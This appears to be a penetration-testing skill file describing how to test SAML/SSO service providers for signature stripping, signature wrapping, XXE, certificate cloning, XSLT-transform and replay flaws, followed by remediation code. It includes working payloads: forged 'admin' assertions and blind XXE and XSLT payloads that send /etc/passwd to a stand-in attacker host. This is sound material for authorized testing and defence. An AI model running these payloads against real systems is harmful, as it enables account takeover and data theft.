---
name: wstg-idnt-06
description: "Testing for SAML/SSO Federation Vulnerabilities"
category: identity-management
owasp_id: WSTG-IDNT-06
version: "1.0.0"
author: cyberstrike-official
tags: [saml, sso, federation, xml, identity, wstg, idnt]
tech_stack: [saml, sso, oauth, adfs, okta, keycloak]
cwe_ids: [CWE-347, CWE-290, CWE-611]
chains_with: [wstg-idnt-01, wstg-authz-05, wstg-inpv-07]
prerequisites: [wstg-info-01]
severity_boost:
  wstg-authz-05: "A forged/replayed SAML assertion establishes an SP session as an arbitrary user (or admin) upstream of any OAuth layer — the OAuth server treats the SAML-authenticated identity as already verified, so token issuance inherits the forged identity without its own checks ever firing (Critical)"
  wstg-idnt-01: "Signature-bypass or attribute-injection in the SAML assertion lets the attacker set the group/role attribute the SP maps directly onto RBAC — combined with weak role-boundary enforcement this is a one-request path to an administrator session (Critical)"
---

# wstg-idnt-06

## Test ID

WSTG-IDNT-06

## Test Name

Testing for SAML/SSO Federation Vulnerabilities

## High-Level Description

SAML (Security Assertion Markup Language) is an XML-based standard used by Identity Providers (IdP) and Service Providers (SP) to implement federated Single Sign-On (SSO). Trust between IdP and SP is anchored entirely on XML digital signature validation of the `<Assertion>` or `<Response>` element — if an implementation validates a signature but fails to verify *which specific element* that signature covers, or skips signature validation under certain conditions, an attacker can forge, wrap, or replay assertions to authenticate as any user, including administrators, without ever knowing a password.

This is not an OWASP WSTG 4.2 official numbered test — it is a **deliberate extension** of the `identity-management` category (which the CyberStrike skill taxonomy explicitly scopes to "SSO, OAuth, SAML, federation"), filling the SAML/SSO gap the same way `wstg-authz-05` extends `authorization` for OAuth and `wstg-sess-10` extends `session-management` for JWT. SAML flaws are XML-parsing and cryptographic-trust bugs, not simple HTTP logic bugs, so they warrant their own dedicated methodology distinct from generic OAuth or session testing.

Because a SAML assertion is a bearer credential that grants an authenticated session directly, successful exploitation is almost always full authentication bypass or account takeover — there is no "read-only" version of this bug class.

---

## What to Check

### Trust & Signature Validation

- [ ] Whether the SP requires a signed `<Response>`/`<Assertion>` at all (Signature Stripping)
- [ ] Whether the signing certificate is a real CA-issued cert or a clonable self-signed cert (Invalid Signature / Certificate Faking)
- [ ] Whether the SP validates the signature against the *specific* signed element (`Reference URI`) rather than "a signature exists somewhere in the document" (XML Signature Wrapping)
- [ ] Whether XML comments inside `<NameID>`/attribute values are stripped before or after the value is used for authorization decisions (XML Comment Injection)
- [ ] Whether XML parsing has DTD/external-entity processing disabled (XXE)
- [ ] Whether `<ds:Transform>`/XSLT is permitted inside the `<Signature>` block (XSLT Transform RCE/SSRF)

### Assertion Content & Lifecycle

- [ ] `NameID` / attribute manipulation to impersonate another user or elevate role/group claims
- [ ] Assertion replay — is `InResponseTo`, `NotOnOrAfter`, `NotBefore`, and `OneTimeUse` actually enforced server-side?
- [ ] `AudienceRestriction` enforcement (does an assertion issued for SP-A work against SP-B?)
- [ ] Encryption of `<EncryptedAssertion>` — is it required, or does the SP silently accept a plaintext `<Assertion>` instead?
- [ ] Binding downgrade — does the SP accept an unsigned HTTP-Redirect binding message when only HTTP-POST is supposed to be signed?

### SSO/SLO Endpoints

- [ ] Unauthenticated `LogoutRequest` (Single Logout) accepted with attacker-controlled `NameID` — session-fixation / DoS-logout of arbitrary users
- [ ] XML/XXE injection through the SLO endpoint
- [ ] IdP-initiated vs SP-initiated flow — is `InResponseTo` required on IdP-initiated flows (it legitimately can't be), and is that difference abused to bypass replay checks?
- [ ] Metadata endpoints (`/metadata`, `/Shibboleth.sso/Metadata`) leaking signing certs, entityIDs, ACS URLs useful for forging requests

---

## How to Test

### Step 1: Recon — Discover Endpoints and Decode Messages

```bash
# Pull SP and IdP metadata (leaks ACS URL, entityID, signing cert)
curl -s "https://{sp}/saml/metadata" -o sp-metadata.xml
curl -s "https://{idp}/metadata" -o idp-metadata.xml
xmllint --format sp-metadata.xml | grep -E "AssertionConsumerService|X509Certificate|entityID"

# Common SSO/ACS/metadata endpoints across major stacks
endpoints=(
    "/saml/login" "/saml/metadata" "/saml/acs" "/saml/sso"
    "/simplesaml/saml2/idp/SSOService.php" "/simplesaml/saml2/idp/metadata.php"
    "/adfs/ls" "/adfs/services/trust" "/federationmetadata/2007-06/federationmetadata.xml"
    "/Shibboleth.sso/Login" "/Shibboleth.sso/Metadata" "/Shibboleth.sso/SLO"
    "/auth/realms/{realm}/protocol/saml" "/auth/realms/{realm}/protocol/saml/descriptor"
    "/sso/saml" "/login/saml2/sso" "/sp/ACS.saml2" "/idp/profile/SAML2/Redirect/SSO"
)
for e in "${endpoints[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://{target}$e")
    [ "$status" != "404" ] && echo "[FOUND] $e ($status)"
done
```

```python
#!/usr/bin/env python3
# Decode SAMLResponse (HTTP-POST binding: base64 only)
import base64, sys
print(base64.b64decode(sys.argv[1]).decode())

# Decode SAMLRequest (HTTP-Redirect binding: deflate + base64, URL-encoded)
import zlib, urllib.parse
def decode_redirect(saml_request):
    raw = base64.b64decode(urllib.parse.unquote(saml_request))
    return zlib.decompress(raw, -15).decode()

def encode_redirect(xml_str):
    compressed = zlib.compressobj(9, zlib.DEFLATED, -15).compress(xml_str.encode())
    compressed += zlib.compressobj(9, zlib.DEFLATED, -15).flush()
    return urllib.parse.quote(base64.b64encode(compressed))
```

Confirm the message is SAML: it must contain `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"` (or the `saml2p:` prefix variant).

### Step 2: Signature Stripping (Invalid/Missing Signature)

```bash
# 1. Capture a valid, signed SAMLResponse via a proxy (Burp/ZAP) during normal login
# 2. Decode it, then test each variant below and replay to the ACS URL

# Variant A: remove the <ds:Signature>...</ds:Signature> block entirely
python3 - <<'EOF'
import re
xml = open("response.xml").read()
stripped = re.sub(r"<ds:Signature.*?</ds:Signature>", "", xml, flags=re.S)
open("response_nosig.xml", "w").write(stripped)
EOF

# Variant B: keep the Signature element but blank the SignatureValue
sed -i 's#<ds:SignatureValue>.*</ds:SignatureValue>#<ds:SignatureValue></ds:SignatureValue>#' response.xml

# Re-encode and POST to the ACS endpoint
b64=$(base64 -w0 response_nosig.xml)
curl -s -X POST "https://{sp}/saml/acs" \
    --data-urlencode "SAMLResponse=$b64" \
    -d "RelayState=/"
# [VULN] if the SP returns a 200/302 with an authenticated session (not a SAML error)
```

If the SP rejects the unsigned assertion but the signing certificate embedded in the response is **self-signed**, attempt Certificate Faking (Step 6).

### Step 3: XML Signature Wrapping (XSW1–XSW8)

XSW attacks exploit SPs that validate a signature is cryptographically valid, then locate the "signed" data by ID/document-order instead of following the signature's own `Reference URI`. By inserting a *forged, unsigned* copy of the assertion in a position the parser reads first (while the *original, signed* assertion stays in the document only to satisfy signature validation), the SP authenticates as the forged identity.

| Variant | Target        | Technique                                                                                   |
| ------- | ------------- | --------------------------------------------------------------------------------------------- |
| XSW1    | Response      | Clone unsigned Response, append **after** the signed original                                 |
| XSW2    | Response      | Clone unsigned Response, insert **before** the signed original                                |
| XSW3    | Assertion     | Clone unsigned Assertion, insert **before** the legitimate signed Assertion                   |
| XSW4    | Assertion     | Clone unsigned Assertion, insert **inside** the legitimate signed Assertion                   |
| XSW5    | Assertion     | Modify a value in the *signed* copy; append the original (sig stripped) at the end            |
| XSW6    | Assertion     | Modify a value in the *signed* copy; insert the original (sig stripped) after the signature    |
| XSW7    | Assertion     | Add an `<Extensions>` block containing a cloned unsigned Assertion                             |
| XSW8    | Assertion     | Add an `<Object>` block (inside Signature) containing a copy of the Assertion, sig removed      |

XSW1 structural example — forged assertion (FA) is processed first, legitimate signed assertion (LA) with its signature (LAS) still validates cryptographically:

```xml
<SAMLResponse>
  <FA ID="evil">
      <Subject>Attacker</Subject>
  </FA>
  <LA ID="legitimate">
      <Subject>Legitimate User</Subject>
      <LAS>
         <Reference URI="#legitimate"></Reference>
      </LAS>
  </LA>
</SAMLResponse>
```

Practical workflow:

```bash
# Use the Burp extensions rather than hand-rolling XML — the reference implementations
# correctly preserve namespaces, ID attributes and canonicalization quirks:
#   - CompassSecurity/SAMLRaider (SAML2 Burp extension) -> right-click captured
#     SAMLResponse -> "SAML Raider Messages" tab -> select each XSW1..XSW8 -> Send
#   - d0ge/XSW (dedicated XML Signature Wrapping Burp extension)

# Manual XSW3 sketch with xmlstarlet, once you understand the target's XML structure:
xmlstarlet ed -s "//saml2p:Response" -t elem -n "InjectedAssertion" -v "" response.xml \
  | xmlstarlet ed -m "//saml2:Assertion" "//InjectedAssertion" > xsw3_response.xml
# Then edit the injected clone's <NameID> to the target identity and strip its own
# (nonexistent) signature, re-encode, and POST to the ACS endpoint.
```

Detection: send each variant to the ACS endpoint and check whether the session identity matches the **forged** Subject/NameID rather than the one under the valid signature.

### Step 4: XML Comment Injection (CVE-2017-11427/11428/11429/11430, CVE-2018-0489, CVE-2018-7340)

Some XML parsers strip comments *after* extracting the NameID text node used for auth decisions, others strip it *before* — a mismatch lets a comment truncate the effective username while a differently-parsed library reads the full node during signature computation.

```xml
<saml2:NameID>admin@target.com<!---->.evil.com</saml2:NameID>
```

```bash
# If you control (or can influence) any part of a NameID / attribute value that gets
# reflected into an assertion (e.g. via a federated IdP you also administer, or a
# self-registration flow feeding into SAML), inject a comment mid-string:
#   real-admin@target.com<!--injected-->@attacker.com
# then check whether the SP's identity resolution reads the pre-comment substring
# (impersonating real-admin@target.com) while its own signature validation covers
# the full node value, or vice-versa.
```

Affected libraries historically: OneLogin python-saml, OneLogin ruby-saml, Clever saml2-js, OmniAuth-SAML, Shibboleth, Duo Network Gateway. Confirm patched versions are in use even if exploitation isn't directly reproducible.

### Step 5: XML External Entity (XXE) via SAML Message

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="https://{sp}/saml/acs" ID="_id39453084082248801717742013"
  IssueInstant="2026-08-19T10:28:53.593Z" Version="2.0">
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml2:AttributeStatement>
      <saml2:Attribute Name="uid">
        <saml2:AttributeValue>&xxe;</saml2:AttributeValue>
      </saml2:Attribute>
    </saml2:AttributeStatement>
  </saml2:Assertion>
</saml2p:Response>
```

```bash
# Out-of-band variant for blind XXE (SSRF confirmation / data exfil)
cat > xxe_oob.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE Response [
  <!ENTITY % remote SYSTEM "http://attacker.example.com/xxe.dtd">
  %remote;
]>
EOF
# xxe.dtd on attacker server:
#   <!ENTITY % file SYSTEM "file:///etc/passwd">
#   <!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://attacker.example.com/?d=%file;'>">
#   %eval; %exfil;

b64=$(base64 -w0 xxe_oob.xml)
curl -s -X POST "https://{sp}/saml/acs" --data-urlencode "SAMLResponse=$b64"
# Check attacker.example.com access logs for the callback
```

Numeric/entity substitution alone can also bypass naive signature checks: entities like `&s;`/`&f1;` resolve during XML parsing (post-signature-verification) but the raw signed bytes never change, so a value like `&s;taf&f1;` can smuggle a substring through the signature check while resolving to a manipulated attribute value downstream (e.g. `uid=taf`).

### Step 6: Certificate Faking / Signature Cloning

```bash
# Extract the IdP's certificate embedded in captured SAML responses or metadata
openssl x509 -in idp-cert.pem -noout -subject -issuer -serial -dates
# If self-signed (Issuer == Subject) it is clonable:
openssl x509 -in idp-cert.pem -noout -text | grep -A2 "Subject:"

# Forge a new self-signed cert with an identical Subject/Issuer/Serial, new keypair
openssl req -x509 -newkey rsa:2048 -keyout fake_key.pem -out fake_cert.pem \
    -days 3650 -nodes -subj "/CN=<same CN as idp-cert.pem>"

# Sign a forged assertion with the new private key (xmlsec1)
xmlsec1 --sign --privkey-pem fake_key.pem,fake_cert.pem \
    --output forged_signed_response.xml forged_response.xml

# Submit — succeeds only if the SP validates the cert by embedded value / subject
# match rather than pinning against a specific known-good certificate/thumbprint
b64=$(base64 -w0 forged_signed_response.xml)
curl -s -X POST "https://{sp}/saml/acs" --data-urlencode "SAMLResponse=$b64"
```

### Step 7: XSLT Transform (RCE / SSRF / File Read)

If the SP's XML-DSig library permits an XSLT `<ds:Transform>` inside the `<Signature>` block, the transform executes during signature *verification*, before trust is established:

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  <ds:SignedInfo>
    <ds:Reference URI="#assertion-id">
      <ds:Transforms>
        <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
          <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
            <xsl:template match="doc">
              <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
              <xsl:variable name="escaped" select="encode-for-uri($file)"/>
              <xsl:value-of select="unparsed-text(concat('http://attacker.example.com/', $escaped))"/>
            </xsl:template>
          </xsl:stylesheet>
        </ds:Transform>
      </ds:Transforms>
    </ds:Reference>
  </ds:SignedInfo>
</ds:Signature>
```

Impact ranges from SSRF (`unparsed-text` making an outbound request) to local file disclosure, and in vulnerable XSLT processors (e.g. some `libxslt`/Xalan configurations) to remote code execution via `exec`/document() extensions. Historical case: CVE-2018-2998/CVE-2018-2933 (Oracle WebLogic SAML).

### Step 8: Assertion Replay & Lifecycle Enforcement

```bash
# Capture a valid SAMLResponse (proxy). Log out, then replay the exact same message:
curl -s -X POST "https://{sp}/saml/acs" \
    --data-urlencode "SAMLResponse=$CAPTURED_B64" -c replay_cookies.txt
# [VULN] if replay succeeds after NotOnOrAfter has elapsed, or after the assertion
# was already consumed once (missing OneTimeUse / InResponseTo tracking)

# Cross-SP replay — capture an assertion issued for SP-A, replay against SP-B that
# trusts the same IdP; should fail AudienceRestriction if enforced correctly
curl -s -X POST "https://{sp-b}/saml/acs" --data-urlencode "SAMLResponse=$CAPTURED_B64"
```

### Step 9: Single Logout (SLO) Injection

```bash
# Unauthenticated / unsigned LogoutRequest with an arbitrary NameID (session
# takedown / targeted DoS-logout of any user if the SP doesn't require the SLO
# request to be signed and matched against an active IdP session)
cat > logout.xml <<EOF
<samlp:LogoutRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  ID="_forged" Version="2.0" IssueInstant="2026-08-19T10:00:00Z">
  <saml:Issuer>{idp}</saml:Issuer>
  <saml:NameID>victim@{target}</saml:NameID>
</samlp:LogoutRequest>
EOF
b64=$(base64 -w0 logout.xml | tr -d '\n')
curl -s -G "https://{sp}/saml/slo" --data-urlencode "SAMLRequest=$b64"

# XXE/XML injection through the SLO endpoint uses the same payloads as Step 5 —
# SLO parsers are frequently a lower-scrutiny code path than the main ACS handler
```

---

## Tools

| Tool                                     | Purpose                                              | Usage                                                                 |
| ----------------------------------------- | ----------------------------------------------------- | ---------------------------------------------------------------------- |
| **SAML Raider** (CompassSecurity)         | Burp extension — edit, sign, XSW-generate SAML msgs   | Intercept SAMLResponse → SAML Raider tab → edit XML / apply XSW1-8    |
| **XSW** (d0ge)                            | Dedicated Burp extension for all 8 XSW variants        | Generates each wrapping variant automatically from a captured message |
| **ZAP SAML Support add-on**               | Detect, view, edit, fuzz SAML requests                | Passive detection + active fuzz of SAML params                        |
| **SAMLExtractor**                         | Extracts SAML request/response fields from proxy logs | Bulk recon across many captured flows                                 |
| **xmlsec1**                                | CLI XML-DSig sign/verify                              | Sign forged assertions with a faked certificate                       |
| **openssl**                               | Cert generation/inspection                            | Clone self-signed IdP certs (Step 6)                                  |
| **xmllint / xmlstarlet**                  | XML formatting & editing                              | Pretty-print, inject elements for manual XSW construction             |
| **Burp Suite / OWASP ZAP**                | Proxy/interception                                    | Capture SAMLRequest/SAMLResponse for offline manipulation              |

---

## Example Commands/Payloads

### Ready-to-Use SAML Cheat Sheet

```bash
BASE="https://{sp}"
ACS="$BASE/saml/acs"

# Decode + re-encode POST binding
decode() { base64 -d; }
encode() { base64 -w0; }

# 1. Unsigned assertion probe (Signature Stripping)
xmllint --format response.xml | sed '/<ds:Signature/,/<\/ds:Signature>/d' > response_nosig.xml
curl -s -X POST "$ACS" --data-urlencode "SAMLResponse=$(cat response_nosig.xml | encode)"

# 2. Blind XXE OOB probe
curl -s -X POST "$ACS" --data-urlencode "SAMLResponse=$(cat xxe_oob.xml | encode)"

# 3. NameID / attribute manipulation — change Subject to a privileged account
sed -i 's#<saml2:NameID[^<]*>.*</saml2:NameID>#<saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">admin</saml2:NameID>#' response.xml

# 4. Replay a previously-consumed assertion after logout
curl -s -X POST "$ACS" --data-urlencode "SAMLResponse=$CAPTURED_B64" -c after_replay.txt

# 5. Cross-audience replay against a sibling SP trusting the same IdP
curl -s -X POST "https://{sp-b}/saml/acs" --data-urlencode "SAMLResponse=$CAPTURED_B64"

# 6. Force SP-initiated flow into IdP-initiated shape to skip InResponseTo checks
curl -s -X POST "$ACS" --data-urlencode "SAMLResponse=$(cat idp_initiated.xml | encode)"
```

### Signature-stripped assertion (baseline PoC — NameID=admin, no signature)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="https://{sp}/saml/acs" ID="id39453084082248801717742013" IssueInstant="2026-08-19T10:28:53.593Z" Version="2.0">
    <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">{idp}</saml2:Issuer>
    <saml2p:Status xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
    </saml2p:Status>
    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id3945308408248426654986295" IssueInstant="2026-08-19T10:28:53.593Z" Version="2.0">
        <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">{idp}</saml2:Issuer>
        <saml2:Subject xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">admin</saml2:NameID>
            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml2:SubjectConfirmationData NotOnOrAfter="2026-08-19T10:33:53.593Z" Recipient="https://{sp}/saml/acs" />
            </saml2:SubjectConfirmation>
        </saml2:Subject>
        <saml2:Conditions NotBefore="2026-08-19T10:23:53.593Z" NotOnOrAfter="2026-08-19T10:33:53.593Z" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AudienceRestriction>
                <saml2:Audience>{sp}</saml2:Audience>
            </saml2:AudienceRestriction>
        </saml2:Conditions>
        <saml2:AuthnStatement AuthnInstant="2026-08-19T10:28:49.876Z" SessionIndex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AuthnContext>
                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
            </saml2:AuthnContext>
        </saml2:AuthnStatement>
    </saml2:Assertion>
</saml2p:Response>
```

### Detection Patterns

| Signal                                                                 | Meaning                                                  |
| ------------------------------------------------------------------------ | ----------------------------------------------------------- |
| ACS accepts a Response with `<ds:Signature>` fully removed                | [VULN] Signature Stripping — auth bypass                    |
| Session identity matches the forged (unsigned) assertion in an XSW payload | [VULN] XML Signature Wrapping — impersonation               |
| Value truncates at an injected `<!--comment-->` in NameID/attribute       | [VULN] XML Comment Handling — impersonation                 |
| Entity reference (`&xxe;`) resolves to file contents in the SP's response  | [VULN] XXE — file disclosure / SSRF                          |
| Callback received on attacker-controlled listener after OOB XXE payload    | [VULN] Blind XXE confirmed                                  |
| Self-signed IdP cert re-signed assertion is accepted                       | [VULN] Certificate Faking — no CA/thumbprint pinning         |
| `unparsed-text()`/outbound request fires from an XSLT `<ds:Transform>`     | [VULN] XSLT Transform — RCE/SSRF/file read                   |
| Same SAMLResponse accepted twice, or accepted after `NotOnOrAfter`         | [VULN] Assertion Replay — missing OneTimeUse/expiry enforcement |
| Assertion issued for SP-A accepted by SP-B                                 | [VULN] AudienceRestriction not enforced                     |
| Unsigned/unauthenticated `LogoutRequest` terminates an arbitrary user's session | [VULN] SLO injection — targeted session takedown          |

---

## Remediation Guide

### 1. Enforce Strict Signature-to-Element Binding

```python
# Never treat "a valid signature exists in the document" as sufficient.
# Resolve the Signature's own Reference URI and verify it points to the
# exact Assertion/Response element you are about to trust, and that
# element count matches exactly (reject documents with >1 Assertion
# unless explicitly designed for it).
from signxml import XMLVerifier

def verify_saml_response(xml_doc, idp_cert):
    verified = XMLVerifier().verify(xml_doc, x509_cert=idp_cert)
    signed_element = verified.signed_xml   # the element the Reference URI points to
    assertions = xml_doc.findall(".//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion")
    if len(assertions) != 1:
        raise SecurityError("Multiple Assertion elements present — possible XSW")
    if assertions[0] is not signed_element:
        raise SecurityError("Signed element does not match the Assertion being processed")
    return signed_element
```

### 2. Disable DTD/External Entities in the XML Parser

```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
# Reject any document containing a DOCTYPE outright before parsing further
if b"<!DOCTYPE" in raw_xml:
    raise SecurityError("DOCTYPE not permitted in SAML messages")
```

### 3. Pin the IdP Certificate — Don't Trust the Embedded One

```python
# Compare against a locally-stored, out-of-band-provisioned certificate/thumbprint —
# never trust the X509Certificate value embedded inside the message/metadata itself
import hashlib

TRUSTED_IDP_THUMBPRINT = "AB:CD:EF:..."  # pinned at SP configuration time, out-of-band

def validate_signing_cert(embedded_cert_der):
    thumb = hashlib.sha256(embedded_cert_der).hexdigest()
    if thumb != TRUSTED_IDP_THUMBPRINT.replace(":", "").lower():
        raise SecurityError("Signing certificate does not match pinned IdP thumbprint")
```

### 4. Enforce Assertion Lifecycle Server-Side

```python
def validate_conditions(assertion, now, expected_audience, session_store):
    conditions = assertion.find(".//Conditions")
    not_before = parse_time(conditions.get("NotBefore"))
    not_on_or_after = parse_time(conditions.get("NotOnOrAfter"))
    if not (not_before <= now < not_on_or_after):
        raise SecurityError("Assertion outside validity window")

    audience = conditions.find(".//Audience").text
    if audience != expected_audience:
        raise SecurityError("AudienceRestriction mismatch")

    assertion_id = assertion.get("ID")
    if session_store.was_consumed(assertion_id):
        raise SecurityError("Assertion replay detected")
    session_store.mark_consumed(assertion_id, expires_at=not_on_or_after)

    in_response_to = assertion.get("InResponseTo")
    if in_response_to and not session_store.matches_pending_request(in_response_to):
        raise SecurityError("InResponseTo does not match an outstanding AuthnRequest")
```

### 5. Disallow XSLT Transforms in Signature Processing

```python
# Only permit the standard canonicalization transforms — reject anything else,
# especially http://www.w3.org/TR/1999/REC-xslt-19991116
ALLOWED_TRANSFORMS = {
    "http://www.w3.org/2000/09/xmldsig#enveloped-signature",
    "http://www.w3.org/2001/10/xml-exc-c14n#",
}
for transform in signature_reference.findall(".//Transform"):
    if transform.get("Algorithm") not in ALLOWED_TRANSFORMS:
        raise SecurityError(f"Disallowed transform: {transform.get('Algorithm')}")
```

### 6. Require and Validate `<EncryptedAssertion>` for Sensitive Deployments

- Configure the SP to require encrypted assertions, not just signed ones, when attributes carry sensitive data.
- Reject any plaintext `<Assertion>` that arrives outside an `<EncryptedAssertion>` wrapper once encryption is mandated.

### 7. Require Signed LogoutRequests and Bind Them to an Active Session

```python
def handle_logout_request(logout_request, active_sessions):
    if not verify_signature(logout_request, idp_cert):
        raise SecurityError("Unsigned LogoutRequest rejected")
    name_id = logout_request.find(".//NameID").text
    session_index = logout_request.find(".//SessionIndex").text
    if (name_id, session_index) not in active_sessions:
        raise SecurityError("LogoutRequest does not match an active IdP session")
    active_sessions.terminate(name_id, session_index)
```

---

## Risk Assessment

### CVSS Score

| Finding                                                | CVSS | Severity |
| -------------------------------------------------------- | ---- | -------- |
| Signature stripping / missing signature validation       | 9.8  | Critical |
| XML Signature Wrapping (any XSW1-8 variant)               | 9.8  | Critical |
| Certificate faking accepted (self-signed clone)           | 9.8  | Critical |
| XXE via SAML message (file disclosure)                    | 8.6  | High     |
| Blind XXE / SSRF via SAML message                         | 7.5  | High     |
| XSLT Transform RCE                                         | 9.8  | Critical |
| XML Comment injection (username truncation impersonation)  | 8.8  | High     |
| Assertion replay (missing OneTimeUse/expiry enforcement)   | 8.1  | High     |
| AudienceRestriction not enforced (cross-SP replay)          | 7.1  | High     |
| Unauthenticated/unsigned LogoutRequest (session takedown)  | 6.5  | Medium   |

**Full Authentication Bypass Vector (typical for signature-related findings)**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

---

## CWE Categories

| CWE ID      | Title                                               | Description                                              |
| ----------- | ---------------------------------------------------- | ---------------------------------------------------------- |
| **CWE-347** | Improper Verification of Cryptographic Signature      | Signature exists but isn't bound to the correct element    |
| **CWE-290** | Authentication Bypass by Spoofing                      | Forged/replayed assertion accepted as valid authentication |
| **CWE-611** | Improper Restriction of XML External Entity Reference  | XXE via SAML message parsing                                |
| **CWE-91**  | XML Injection (Blind XPath Injection)                  | Comment injection / structural XML manipulation             |
| **CWE-345** | Insufficient Verification of Data Authenticity          | Trusting a self-signed/unpinned certificate                |
| **CWE-613** | Insufficient Session Expiration                         | Assertion replay after expiry / missing OneTimeUse          |

---

## References

- [PayloadsAllTheThings - SAML Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SAML%20Injection)
- [OWASP SAML Security Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md)
- [CompassSecurity/SAMLRaider](https://github.com/CompassSecurity/SAMLRaider)
- [d0ge/XSW - XML Signature Wrapping Burp Extension](https://github.com/d0ge/XSW)
- [ZAP SAML Support Add-on](https://www.zaproxy.org/docs/desktop/addons/saml-support/)
- [On Breaking SAML: Be Whoever You Want to Be - Somorovsky et al., USENIX Security 2012](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf)
- [How to Hunt Bugs in SAML: a Methodology (Parts I-III) - Ben Risher (@epi052)](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
- [Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - NetSPI](https://web.archive.org/web/20171113204302/https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/)
- [The road to your codebase is paved with forged assertions (GitHub Enterprise SAML XSW) - Ioannis Kakavas](https://web.archive.org/web/20170314055835/http://www.economyofmechanism.com/github-saml)
- [Oracle WebLogic Multiple SAML Vulnerabilities (CVE-2018-2998/CVE-2018-2933)](https://web.archive.org/web/20181221074856/https://pulsesecurity.co.nz/advisories/WebLogic-SAML-Vulnerabilities)
- [OWASP WSTG - Identity Management Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/)
- [PortSwigger - SAML Security Vulnerabilities](https://portswigger.net/web-security/saml)

---

## Checklist

```
[ ] SAML SSO/ACS/metadata endpoints identified
[ ] Signing certificate reviewed (real CA vs self-signed/clonable)
[ ] Signature stripping tested (no-signature and blanked-signature variants)
[ ] All XSW variants (XSW1-XSW8) tested against ACS endpoint
[ ] XML comment injection tested in NameID / attribute values
[ ] XXE tested in SAML message (in-band and blind/OOB)
[ ] XSLT Transform tested for RCE/SSRF/file read
[ ] Certificate faking / cloning attempted against self-signed certs
[ ] NameID / attribute manipulation tested for impersonation
[ ] Assertion replay tested (post-expiry, post-logout, second-use)
[ ] AudienceRestriction cross-SP replay tested
[ ] InResponseTo / IdP-initiated vs SP-initiated flow differences tested
[ ] LogoutRequest injection and unauthenticated SLO tested
[ ] Encrypted vs plaintext assertion enforcement checked
[ ] Findings documented with CVSS and reproduction steps
[ ] Remediation recommendations provided
```
